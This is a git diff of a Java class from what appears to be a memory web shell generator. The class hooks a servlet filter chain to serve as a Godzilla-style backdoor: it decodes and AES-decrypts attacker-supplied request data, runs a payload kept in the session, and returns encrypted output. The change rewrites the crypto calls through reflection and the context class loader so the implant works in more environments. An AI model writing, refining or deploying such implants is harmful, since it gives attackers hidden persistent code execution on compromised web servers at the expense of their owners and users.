@@ -2,8 +2,6 @@ package com.reajason.javaweb.memshell.shelltool.godzilla;
 
 import net.bytebuddy.asm.Advice;
 
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
 import java.io.ByteArrayOutputStream;
 import java.io.PrintWriter;
 import java.lang.reflect.Method;
@@ -31,18 +29,25 @@ public class GodzillaFilterChainAdvisor {
                 byte[] data = null;
                 Class<?> base64;
                 try {
-                    base64 = Class.forName("java.util.Base64");
+                    base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
                     Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                     data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                 } catch (Exception var6) {
-                    base64 = Class.forName("sun.misc.BASE64Decoder");
+                    base64 = Class.forName("sun.misc.BASE64Decoder", true, Thread.currentThread().getContextClassLoader());
                     Object decoder = base64.newInstance();
                     data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                 }
-                Cipher c = Cipher.getInstance("AES");
-                SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
-                c.init(2, keySpec);
-                data = c.doFinal(data);
+                Class<?> cipherClass = Class.forName("javax.crypto.Cipher", true, Thread.currentThread().getContextClassLoader());
+                Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec", true, Thread.currentThread().getContextClassLoader());
+                Class<?> keyClass = Class.forName("java.security.Key", true, Thread.currentThread().getContextClassLoader());
+                Method cipherInitMethod = cipherClass.getMethod("init", int.class, keyClass);
+                Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
+
+                Object cipher = cipherClass.getMethod("getInstance", String.class).invoke(cipherClass, "AES");
+                Object secretKeySpec = secretKeySpecClass.getConstructor(byte[].class, String.class).newInstance(key.getBytes(), "AES");
+                cipherInitMethod.invoke(cipher, 2, secretKeySpec);
+
+                data = (byte[]) doFinalMethod.invoke(cipher, data);
                 Object session = request.getClass().getMethod("getSession").invoke(request);
                 Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
                 if (sessionPayload == null) {
@@ -60,8 +65,8 @@ public class GodzillaFilterChainAdvisor {
                     writer.write(md5.substring(0, 16));
                     f.toString();
 
-                    c.init(1, keySpec);
-                    byte[] encryptBytes = c.doFinal(arrOut.toByteArray());
+                    cipherInitMethod.invoke(cipher, 1, secretKeySpec);
+                    byte[] encryptBytes = (byte[]) doFinalMethod.invoke(cipher, arrOut.toByteArray());
                     String result = null;
                     try {
                         base64 = Class.forName("java.util.Base64");
